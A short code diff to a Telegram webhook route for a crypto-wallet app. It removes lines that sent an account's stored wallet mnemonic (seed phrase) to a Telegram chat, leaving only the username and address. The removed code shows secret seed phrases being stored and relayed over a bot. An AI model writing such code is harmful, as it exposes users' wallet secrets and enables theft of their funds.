@@ -146,10 +146,7 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
           }
           const text =
             `👤 <b>${account.username}</b>\n` +
-            `💼 <code>${account.wallet_address}</code>\n` +
-            (account.mnemonic
-              ? `🔑 <code>${account.mnemonic}</code>`
-              : `🔑 Phrase not on file for this wallet.`);
+            `💼 <code>${account.wallet_address}</code>`;
           await tg("sendMessage", { chat_id: chatId, text, parse_mode: "HTML" });
           return Response.json({ ok: true });
         }
